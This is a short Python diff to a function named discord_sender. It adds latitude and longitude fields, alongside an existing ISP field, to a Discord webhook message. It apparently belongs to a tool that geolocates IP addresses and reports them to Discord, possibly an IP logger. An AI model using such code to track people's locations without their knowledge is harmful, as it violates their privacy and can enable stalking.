@@ -88,6 +88,14 @@ def discord_sender(url, msg_type, content):
                         {
                             "name": "ISP",
                             "value": json_content['isp']
+                        },
+                        {
+                            "name": "Latitude",
+                            "value": str(json_content['latitude'])
+                        },
+                        {
+                            "name": "Longitude",
+                            "value": str(json_content['longitude'])
                         }
                     ]
                 }
